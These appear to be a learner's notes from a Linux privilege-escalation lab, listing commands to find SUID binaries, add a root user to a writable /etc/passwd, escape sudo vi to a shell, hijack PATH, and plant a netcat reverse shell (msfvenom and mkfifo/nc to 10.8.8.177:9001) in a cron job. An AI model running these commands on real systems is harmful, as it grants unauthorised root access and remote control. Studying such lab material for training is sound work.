#BASIC INFO

```
export IP=10.10.236.200

```

#ENUMERATION
**writable /etc/passwd**


#ABUSING SUID/GUID

```
find / -perm -u=s -type f 2>/dev/null
```
<!---/home/user3/shell--->


#EXPLOIT WRITABLE /ETC/PASSWD
```
openssl passwd -1 -salt new 123
```
<!---$1$new$p7ptkEKU1HnaHpRtzNizS1--->

Create a new user in /etc/passwd
```
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

#ESCAPING VI EDITOR

##user8 has sudo permission to run vi as root

```
sudo vi
:!sh
```
<!---spawn shell --->

#EXPLOTING CRONTAB

cat /etc/crontab for all the cron jobs
use msfvenom to create exploit
msfvenom -p cmd/unix/reverse_netcat lhost=10.8.8.177 lport=9001 R
<!---
	mkfifo /tmp/oamuz; nc 10.8.8.177 9001 0</tmp/oamuz | /bin/sh >/tmp/oamuz 2>&1; rm /tmp/oamuz
--->

#EXPLOITING PATH VARIABLE

./script is running ls, probably sudo as well

```
cd /tmp
echo "/bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH
/user4/script

```